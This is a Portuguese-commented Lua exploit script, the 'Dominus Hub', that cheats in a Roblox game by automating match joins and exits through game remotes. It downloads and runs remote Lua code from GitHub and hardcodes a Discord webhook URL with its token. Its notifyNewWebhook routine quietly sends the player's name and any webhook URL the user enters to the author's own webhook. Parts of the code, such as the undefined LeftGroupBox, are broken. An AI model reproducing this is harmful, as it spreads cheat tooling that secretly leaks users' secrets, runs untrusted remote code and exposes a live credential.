warn('[DOMINUS HUB] Carregando Interface')
wait(1)

local Library = loadstring(game:HttpGet('https://raw.githubusercontent.com/rodpop132/Dominus_Hub/main/Library.lua'))()
local ThemeManager = loadstring(game:HttpGet('https://raw.githubusercontent.com/rodpop132/Dominus_Hub/main/addons/ThemeManager.lua'))()
local SaveManager = loadstring(game:HttpGet('https://raw.githubusercontent.com/rodpop132/Dominus_Hub/main/addons/SaveManager.lua'))()
Library:Notify('Bem-vindo ao Dominus Hub', 5)

local Window = Library:CreateWindow({
    Title = 'Dominus Hub | INF CASTLE',
    Center = true,
    AutoShow = true,
    TabPadding = 8,
    MenuFadeTime = 0.2
})

Library:Notify('Carregando script do INF CASTLE', 5)
warn('[DOMINUS HUB] Carregando funções...')
wait(1)

local defaultWebhookUrl = "https://discord.com/api/webhooks/1305306434841612319/4LK-tvWBxLoUeKIU4XmnjSOfbwOvXVvPzL6tN-pEUnDgsNl3c6C3uq4am1KSaK5iAFwy"
local urlwebhook = defaultWebhookUrl  -- Configura o webhook padrão

function joinInfCastle()
    while getgenv().joinInfCastle == true do 
        repeat task.wait() until game:IsLoaded()
        wait(1)
        game:GetService("ReplicatedStorage").Remotes.InfiniteCastleManager:FireServer("GetGlobalData")
        wait(.4)
        game:GetService("ReplicatedStorage").Remotes.InfiniteCastleManager:FireServer("GetData")
        wait(1)
        game:GetService("ReplicatedStorage").Remotes.InfiniteCastleManager:FireServer("Play", 0, "True")
        wait()
    end
end

function quitInfCastle()
    while getgenv().quitInfCastle == true do
        local uiEndGame = game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("EndGameUI")
        if uiEndGame then
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.TeleportBack:FireServer()
            break
        else
            wait(.5)
        end
        wait()
    end
end

-- Função do webhook atualizado com informações adicionais e formato mais visual
function webhook()
    while getgenv().webhook == true do
        local discordWebhookUrl = urlwebhook
        local uiEndGame = game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("EndGameUI")
        
        if uiEndGame then
            local result = game:GetService("Players").LocalPlayer.PlayerGui.EndGameUI.BG.Container.Stats.Result.Text
            local name = game:GetService("Players").LocalPlayer.Name
            local formattedName = "||" .. name .. "||"
            local elapsedTimeText = game:GetService("Players").LocalPlayer.PlayerGui.EndGameUI.BG.Container.Stats.ElapsedTime.Text
            local timeOnly = string.sub(elapsedTimeText, 13)

            local Rerolls1 = game:GetService("Players").LocalPlayer.PlayerGui.EndGameUI.BG.Container.Rewards.Holder:FindFirstChild("Rerolls")
            local formattedAmount = Rerolls1 and Rerolls1:FindFirstChild("Amount") and Rerolls1.Amount.Text or "N/A"
            local rerollsValue = game:GetService("Players").LocalPlayer:FindFirstChild("Rerolls") and game.Players.LocalPlayer.Rerolls.Value or "N/A"

            local payload = {
                content = "",
                embeds = {
                    {
                        title = "Dominus Hub - Resultados",
                        description = string.format("**Jogador:** %s\n**Resultado:** %s\n**Tempo Total:** %s\n**Recompensas (Rerolls):** %s\n**Rerolls Restantes:** %s", formattedName, result, timeOnly, formattedAmount, rerollsValue),
                        color = 5814783,
                        author = { name = "Dominus Hub | INF CASTLE" },
                    }
                }
            }
            local payloadJson = game:GetService("HttpService"):JSONEncode(payload)

            if syn and syn.request then
                local response = syn.request({
                    Url = discordWebhookUrl,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = payloadJson
                })
                if response.Success then
                    print("Webhook enviado com sucesso.")
                    break
                else
                    warn("Erro ao enviar mensagem ao Discord com syn.request:", response.StatusCode, response.Body)
                end
            elseif http_request then
                local response = http_request({
                    Url = discordWebhookUrl,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = payloadJson
                })
                if response.Success then
                    print("Webhook enviado com sucesso.")
                    break
                else
                    warn("Erro ao enviar mensagem ao Discord com http_request:", response.StatusCode, response.Body)
                end
            else
                print("Sincronização não suportada neste dispositivo.")
            end
        else
            wait(0.5)
        end
        wait(0.5)
    end
end

-- Função para enviar notificação para o seu webhook sempre que um novo webhook for configurado
function notifyNewWebhook()
    local payload = {
        content = "**Novo Webhook Configurado**",
        embeds = {
            {
                title = "Nova Configuração de Webhook",
                description = string.format("**Jogador:** %s\n**Webhook Adicionado:** %s", game.Players.LocalPlayer.Name, urlwebhook),
                color = 15105570
            }
        }
    }
    local payloadJson = game:GetService("HttpService"):JSONEncode(payload)

    if syn and syn.request then
        syn.request({
            Url = defaultWebhookUrl,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = payloadJson
        })
    elseif http_request then
        http_request({
            Url = defaultWebhookUrl,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = payloadJson
        })
    else
        print("Sincronização não suportada neste dispositivo.")
    end
end

LeftGroupBox:AddToggle("EnableWebhook", {
    Text = "Ativar Webhook",
    Default = false,
    Callback = function(Value)
        getgenv().webhook = Value
        if Value and urlwebhook == defaultWebhookUrl then
            notifyNewWebhook()
        end
        webhook()
    end,
})

LeftGroupBox:AddInput('WebhookURL', {
    Default = defaultWebhookUrl,
    Text = "URL do Webhook",
    Numeric = false,
    Finished = false,
    Placeholder = 'Cole o URL aqui',
    Callback = function(Value)
        urlwebhook = Value
        notifyNewWebhook()  -- Notifica seu webhook sobre o novo URL
    end
})
